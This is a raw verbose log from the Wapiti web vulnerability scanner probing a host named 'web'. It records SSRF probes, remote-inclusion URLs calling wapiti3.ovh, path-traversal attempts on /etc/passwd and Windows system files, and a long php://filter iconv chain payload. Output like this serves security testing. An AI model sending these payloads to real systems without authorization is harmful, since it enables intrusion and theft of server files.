2024-03-21 13:03:39.002 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:03:39.805 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 13:03:39.806 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_766e7af1.db
2024-03-21 13:03:39.809 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 13:03:39.850 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 13:03:39.850 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 13:03:39.959 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 13:03:39.998 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 13:03:39.999 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 13:03:40.040 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 13:03:40.052 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:03:40.052 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?redirect_to=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F4j144q%2F1%2F72656469726563745f746f%2F&piereg_logout_url=true (0)
2024-03-21 13:03:40.660 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F4j144q%2F1%2F7069657265675f6c6f676f75745f75726c%2F (0)
2024-03-21 13:03:41.290 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=4j144q for results, please wait...
2024-03-21 13:03:43.487 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 13:03:43.499 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:03:43.502 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&piereg_logout_url=true (0)
2024-03-21 13:03:44.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&piereg_logout_url=true (0)
2024-03-21 13:03:44.710 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:03:45.303 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:03:45.903 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:03:46.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:47.119 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&piereg_logout_url=true (0)
2024-03-21 13:03:47.761 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:48.402 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&piereg_logout_url=true (0)
2024-03-21 13:03:49.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:03:49.624 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:50.225 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&piereg_logout_url=true (0)
2024-03-21 13:03:50.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&piereg_logout_url=true (0)
2024-03-21 13:03:51.375 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&piereg_logout_url=true (0)
2024-03-21 13:03:51.988 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:03:52.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:03:53.217 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:03:53.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:03:54.480 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:03:55.113 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:03:55.727 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:56.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:56.960 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:03:57.565 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:03:58.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:58.839 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:03:59.520 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&piereg_logout_url=true (0)
2024-03-21 13:04:00.198 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:04:00.904 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:04:01.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:04:02.233 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:04:02.920 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:03.589 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:04.225 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:04.833 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:05.433 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:06.067 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:06.649 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:07.248 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:07.835 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:04:08.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:04:09.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:04:09.602 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:04:10.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:10.754 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:11.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:12.024 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:12.613 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:13.217 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:13.783 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:14.355 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:14.919 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=file%3A%2F%2F%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:04:15.484 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&piereg_logout_url=true (0)
2024-03-21 13:04:16.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&piereg_logout_url=true (0)
2024-03-21 13:04:16.619 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&piereg_logout_url=true (0)
2024-03-21 13:04:17.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:17.752 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:18.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&piereg_logout_url=true (0)
2024-03-21 13:04:18.882 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&piereg_logout_url=true (0)
2024-03-21 13:04:19.464 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-21 13:04:20.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-21 13:04:20.606 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%2Fetc%2Fpasswd (0)
2024-03-21 13:04:21.177 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:21.747 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%2Fetc%2Fservices (0)
2024-03-21 13:04:22.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:22.878 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 13:04:23.444 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-21 13:04:24.010 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-21 13:04:24.571 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:25.134 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:25.699 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-21 13:04:26.264 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-21 13:04:26.830 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
